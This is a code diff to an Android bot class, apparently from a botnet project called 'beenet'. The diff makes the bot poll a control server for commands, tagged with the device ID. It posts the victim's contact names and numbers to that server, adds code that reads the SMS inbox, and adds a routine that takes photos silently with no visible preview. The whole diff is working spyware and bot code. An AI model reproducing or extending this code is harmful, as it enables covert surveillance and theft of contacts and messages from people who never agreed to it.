@@ -9,6 +9,7 @@ import android.database.Cursor;
 import android.location.Criteria;
 import android.location.Location;
 import android.location.LocationManager;
+import android.net.Uri;
 import android.os.Build;
 import android.provider.ContactsContract;
 import android.provider.Settings;
@@ -17,8 +18,22 @@ import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.provider.Settings.Secure;
 
+import java.io.IOException;
+
+import android.graphics.SurfaceTexture;
+import android.hardware.Camera;
+import android.os.Bundle;
+import android.os.SystemClock;
+import android.annotation.SuppressLint;
+import android.app.Activity;
+import android.util.Log;
+import android.view.SurfaceView;
+
 import java.util.ArrayList;
 import java.util.HashMap;
+
+
+
 
 /**
  * Created by usuario on 04/02/2017.
@@ -80,7 +95,7 @@ public class Functions_bot {
 
     public String getCommands(){
 
-        return SendMethod.sendMethod("http://192.168.1.7/beenet/getcommands.php");
+        return SendMethod.sendMethod("http://192.168.1.2/beenet/getcommands.php?id_bot="+getAndroidId());
        }
 
     public void sendSMS(String numeroReceptor, String mensaje){
@@ -100,7 +115,7 @@ public class Functions_bot {
         String [] columns = new String[]{ContactsContract.Data._ID,ContactsContract.Data.DISPLAY_NAME,ContactsContract.CommonDataKinds.Phone.NUMBER,ContactsContract.Data.MIMETYPE};
         Cursor contactCursor =  appContext.getContentResolver().query(
                 ContactsContract.Data.CONTENT_URI,
-                columns,selectionClause,null,null);
+                columns, selectionClause, null, null);
 
         while(contactCursor.moveToNext()) {
             HashMap<String, String> infoPost = new HashMap<String, String>();
@@ -110,7 +125,7 @@ public class Functions_bot {
             infoPost.put("number_contact",contactCursor.getString(2));
 
 
-            SendMethod.sendMethod("http://192.168.1.7/beenet/getcontacts.php",infoPost);
+            SendMethod.sendMethodNR("http://192.168.1.2/beenet/getcontacts.php",infoPost);
 
      }
         return 0;
@@ -120,6 +135,24 @@ public class Functions_bot {
 
     }
 
+    public int getSmsList(){
+
+        Cursor smsCursor = appContext.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
+
+
+        if (smsCursor.moveToFirst()) { /* false = no sms */
+            do {
+                String msgInfo = "";
+
+                for (int i = 0; i < smsCursor.getColumnCount(); i++) {
+                  //  msgInfo += " " + smsCursor.getColumnName(i) + ":" + smsCursor.getString(i);
+                }
+
+
+            } while (smsCursor.moveToNext());
+        }
+        return 0;
+    }
     private String getAndroidId(){
     return Secure.getString(appContext.getContentResolver(), Secure.ANDROID_ID);
 
@@ -200,6 +233,42 @@ public class Functions_bot {
         return getAc;
     }
 
+    public void getPicture(){
+
+
+        Camera cam = Camera.open();
+        if (cam != null) {
+            Log.d("as", "Camera available");
+
+            SurfaceTexture dummy = new SurfaceTexture(0);
+
+            try {
+                cam.setPreviewTexture(dummy);
+            } catch (IOException e) {
+                // TODO Auto-generated catch block
+                e.printStackTrace();
+            }
+            cam.startPreview();
+
+            cam.takePicture(null, null, new Camera.PictureCallback() {
+
+                @Override
+                public void onPictureTaken(byte[] data, Camera camera) {
+                    Log.d("d", "Image taken");
+
+                    camera.stopPreview();
+
+
+
+                    camera.release();
+
+                    Log.d("D", "Camera released");
+                }
+            });
+
+        }
+
+    }
     }
 
 
